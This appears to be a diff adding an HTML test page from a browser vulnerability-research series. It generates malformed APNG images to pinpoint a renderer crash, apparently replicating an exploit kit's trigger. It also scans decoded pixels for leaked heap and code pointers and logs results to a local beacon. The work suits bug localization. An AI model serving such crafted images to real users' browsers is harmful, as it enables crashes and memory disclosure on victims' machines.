@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V921</title></head>
+<body><pre id="out">V921 — APNG killer localization: width (16384 vs 64) x default-image (no IDAT vs with IDAT)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V921-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,600))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v921 — v920 established: the P674B death happens when the decoder ACCEPTS
+ * an APNG (any accepted shape kills; len0/lenBig reject cleanly and never
+ * kill; the plainPNG of the same bytes loads fine). The kit ctrl shape is
+ * IHDR(16384x1) + acTL + fcTL(16384x1, seq 0) + fdAT(seq 1) + IEND — NO
+ * IDAT (the default image required before fcTL seq>0 is absent), and its
+ * width makes w*4 = 65536 = 2^16 (16-bit truncation smell). Two candidate
+ * triggers; this grid separates them with honestly-built APNGs:
+ *
+ *   A1  w=64,    WITH IDAT default frame + fdAT frame   (v918-like; expect survive)
+ *   A2  w=16384, WITH IDAT default frame + fdAT frame   (money cell: width alone)
+ *   B1  w=64,    NO IDAT (kit shape, small)             (missing-IDAT alone)
+ *   B2  w=16384, NO IDAT (kit ctrl replica)              (expect death)
+ *
+ * Decode: A2 dies + A1 survives => width-triggered in the APNG frame path
+ * (w*4 = 2^16 truncation candidate; sweep intermediate widths next).
+ * B1 dies + B2 dies => missing-IDAT is the trigger (width irrelevant).
+ * All frames carry our marker fill; any LOADED row is scanned (kit channels).
+ * One build per load; death marked by pending; ?r=1 resets.
+ */
+
+/* ---- PNG builder (stored deflate, CRC32) ---- */
+var CRC_T=(function(){var t=[],c,n,k;for(n=0;n<256;n++){c=n;for(k=0;k<8;k++)c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1);t[n]=c>>>0;}return t;})();
+function crc32(buf,start,end){var c=0xFFFFFFFF;for(var i=start;i<end;i++)c=(CRC_T[(c^buf[i])&0xFF]^(c>>>8))>>>0;return (c^0xFFFFFFFF)>>>0;}
+function push32(a,v){a.push((v>>>24)&255,(v>>>16)&255,(v>>>8)&255,v&255);}
+function chunk(out,type,data){var n=data.length,i;push32(out,n);var cs=out.length;for(i=0;i<4;i++)out.push(type.charCodeAt(i));for(i=0;i<n;i++)out.push(data[i]);var c=crc32(out,cs,out.length);push32(out,c);}
+function zlibStored(raw){var out=[0x78,0x01],i=0;while(i<raw.length){var blk=raw.slice(i,Math.min(i+65535,raw.length));i+=blk.length;var last=(i>=raw.length)?1:0;out.push(last,blk.length&255,(blk.length>>8)&255,(~blk.length)&255,((~blk.length)>>8)&255);for(var j=0;j<blk.length;j++)out.push(blk[j]);}var a=1,b2=0;for(i=0;i<raw.length;i++){a=(a+raw[i])%65521;b2=(b2+a)%65521;}push32(out,((b2<<16)|a)>>>0);return out;}
+function markerRows(w,h){var raw=[],y,x;for(y=0;y<h;y++){raw.push(0);for(x=0;x<w;x++){raw.push(0x41,0xAA,0x41,0xFF);}}return raw;}
+function fctl(seq,w,h){var d=[];push32(d,seq);push32(d,w);push32(d,h);push32(d,0);push32(d,0);d.push(0,10);push32(d,1);d.push(0,0);return d;}
+function fdat(seq,w,h){var d=[];push32(d,seq);var z=zlibStored(markerRows(w,h));for(var i=0;i<z.length;i++)d.push(z[i]);return d;}
+function buildAPNG(w,withIDAT){
+  var out=[],sig=[137,80,78,71,13,10,26,10];for(var i=0;i<8;i++)out.push(sig[i]);
+  var ih=[];push32(ih,w);push32(ih,1);ih.push(8,6,0,0,0);
+  chunk(out,'IHDR',ih);
+  var actl=[];push32(actl,withIDAT?2:1);push32(actl,0);
+  chunk(out,'acTL',actl);
+  if(withIDAT){
+    chunk(out,'fcTL',fctl(0,w,1));
+    chunk(out,'IDAT',zlibStored(markerRows(w,1)));
+    chunk(out,'fcTL',fctl(1,w,1));
+    chunk(out,'fdAT',fdat(2,w,1));
+  }else{
+    chunk(out,'fcTL',fctl(0,w,1));
+    chunk(out,'fdAT',fdat(1,w,1));
+  }
+  chunk(out,'IEND',[]);
+  return out;
+}
+function toDataUrl(b){var s='';for(var i=0;i<b.length;i++)s+=String.fromCharCode(b[i]);return 'data:image/png;base64,'+btoa(s);}
+function scanImage(img,nm){
+  var cv=document.createElement('canvas');cv.width=img.width;cv.height=img.height;
+  var g=cv.getContext('2d');g.drawImage(img,0,0);
+  var id=g.getImageData(0,0,cv.width,cv.height);
+  var d=new Uint8Array(id.data.buffer);
+  var nz=0,heap=0,code=0,other=0,n=Math.min(d.length,65536);
+  for(var i=0;i<n;i+=4){if(d[i]||d[i+1]||d[i+2]||d[i+3])nz++;}
+  for(var j=0;j+8<=n;j+=8){
+    var hiU=((d[j+7]<<24)|(d[j+6]<<16)|(d[j+5]<<8)|d[j+4])>>>0;
+    if(hiU>=8&&hiU<=255)heap++;
+    else if(hiU>=1&&hiU<=7)code++;
+    else if(d[j]|d[j+1]|d[j+2]|d[j+3]|d[j+4]|d[j+5]|d[j+6]|d[j+7])other++;
+  }
+  return 'dims='+img.width+'x'+img.height+' nz4='+nz+' heap='+heap+' code='+code+' other8='+other;
+}
+
+var ARMS=[
+  {n:'A1-w64-IDAT',    w:64,    idat:true},
+  {n:'A2-w16384-IDAT', w:16384, idat:true},
+  {n:'B1-w64-noIDAT',  w:64,    idat:false},
+  {n:'B2-w16384-noIDAT',w:16384,idat:false}
+];
+
+var st={arm:0,pending:null};
+try{
+  if(location.search.indexOf('r=1')>=0){localStorage.removeItem('v921_state');bk('RESET','cleared');}
+  else{var raw=localStorage.getItem('v921_state');if(raw)st=JSON.parse(raw);}
+}catch(e){}
+function save(){try{localStorage.setItem('v921_state',JSON.stringify(st));}catch(e){}}
+
+if(st.pending){
+  var pk=st.pending; st.pending=null; save();
+  bk('KILLER','arm='+ARMS[pk.arm].n+' — the context died in the frame decode of this honestly-built APNG (row banked)');
+}
+
+if(st.arm>=ARMS.length){
+  bk('EXHAUSTED','grid complete: see KILLER rows — width-triggered vs missing-IDAT is now decidable');
+}else{
+  var A=ARMS[st.arm];
+  var bytes=buildAPNG(A.w,A.idat);
+  bk('BOOT','arm='+A.n+'|w='+A.w+'|idat='+A.idat+'|bytes='+bytes.length);
+  st.pending={arm:st.arm}; save();
+  bk('ATTEMPT-PRE','arm='+A.n+' (sync — the next event is decode/scan or the death)');
+  var img=new Image();
+  var killed=false;
+  var to=setTimeout(function(){ if(killed)return; killed=true;
+    bk('LOADTO','hang: '+A.n); st.pending=null; st.arm++; save();
+    setTimeout(function(){location.reload();},300);
+  },6500);
+  img.onload=function(){ clearTimeout(to); if(killed)return; killed=true;
+    st.pending=null; save();
+    try{ bk('LOADED','arm='+A.n+' | '+scanImage(img,A.n)); }catch(e){ bk('SCAN-ERR',e.name); }
+    st.arm++; save();
+    setTimeout(function(){location.reload();},300);
+  };
+  img.onerror=function(){ clearTimeout(to); if(killed)return; killed=true;
+    st.pending=null; st.arm++; save();
+    bk('DECODE-ERR','arm='+A.n+' (rejected cleanly — no context death)');
+    setTimeout(function(){location.reload();},300);
+  };
+  img.src=toDataUrl(bytes);
+}
+</script></body></html>
